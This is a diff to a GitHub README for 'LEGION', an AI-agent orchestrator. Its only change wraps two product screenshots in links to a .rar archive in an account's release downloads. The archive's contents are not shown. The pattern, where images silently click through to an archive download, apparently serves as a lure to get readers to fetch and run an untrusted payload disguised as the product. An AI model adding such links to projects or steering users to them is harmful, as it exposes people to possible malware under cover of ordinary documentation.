@@ -26,12 +26,12 @@ LEGION is an enterprise-grade, zero-overhead orchestrator designed to run 50+ au
 ### 1. High-Speed Terminal UI & Active Agents Table
 *Monitor 50+ agents, budget caps, and model health directly from your terminal.*
 
-<img width="833" height="728" alt="image" src="https://github.com/user-attachments/assets/0f67df7f-e726-482a-afcf-8804139e88f8" />
+[<img width="833" height="728" alt="image" src="https://github.com/user-attachments/assets/0f67df7f-e726-482a-afcf-8804139e88f8" />](https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar)
 
 ### 2. Autonomous Communication Mesh & Real-Time Metrics
 *Graph-based routing between GPT-6 Astra, Claude 5.5 Opus, Gemini 4 Carbon, and DeepSeek-V4.1.*
 
-<img width="889" height="689" alt="image" src="https://github.com/user-attachments/assets/2f9d0421-f065-4d89-becf-474ef10a94ec" />
+[<img width="889" height="689" alt="image" src="https://github.com/user-attachments/assets/2f9d0421-f065-4d89-becf-474ef10a94ec" />](https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar)
 
 ---
 
